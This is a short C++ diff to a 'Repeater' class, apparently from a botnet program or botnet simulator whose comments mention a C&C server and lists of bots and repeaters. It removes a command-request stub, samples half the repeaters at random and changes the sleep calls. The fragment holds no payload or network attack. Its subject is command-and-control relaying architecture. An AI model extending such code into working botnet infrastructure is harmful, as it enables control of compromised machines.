@@ -161,15 +161,6 @@ void Repeater::update_plist()
 
 
 /*
- * get command from C&C server
- */
-command_code Repeater::request_command()
-{
-	return COMMAND_FROM_REPEATER;
-}
-
-
-/*
  * return PList
  */
 bots_t Repeater::plist()
@@ -208,10 +199,12 @@ response_code Repeater::send_message(message_code message)
 /*
  * initialise rlist and plist of repeater before running
  */
-void Repeater::init(bot_t server, bots_t plist, bots_t rlist)
+void Repeater::init(bot_t& server, bots_t& plist, bots_t& rlist)
 {
 	this->m_plist = plist;
-	this->m_rlist = rlist;
+	
+	std::vector< boost::shared_ptr<Bot>  > all_repeaters = rlist;
+	m_rlist = random_bots(all_repeaters, all_repeaters.size() / 2);
 }
 
 
@@ -223,10 +216,10 @@ void Repeater::execute()
 {
         while (true) {
                 update_rlist();
-                sleep(1);
+				boost::this_thread::sleep(boost::posix_time::seconds(1));
                 
                 update_plist();
-                sleep(1);
+                boost::this_thread::sleep(boost::posix_time::seconds(1));
         }
         
         return;
